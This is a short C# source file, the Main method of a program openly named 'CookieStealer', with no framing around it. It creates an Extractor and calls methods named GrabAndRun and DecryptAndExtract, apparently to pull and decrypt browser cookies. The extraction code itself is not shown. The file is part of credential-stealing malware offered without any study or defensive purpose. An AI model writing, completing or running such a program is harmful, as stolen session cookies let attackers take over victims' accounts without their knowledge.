using CookieStealer.Cookies;

namespace CookieStealer;

internal static class Program
{
    private static void Main()
    {
        Console.Clear();
        
        var extractor = new Extractor();
        extractor.GrabAndRun();
        extractor.DecryptAndExtract();
        
        Thread.Sleep(2 * 1000);

    }
}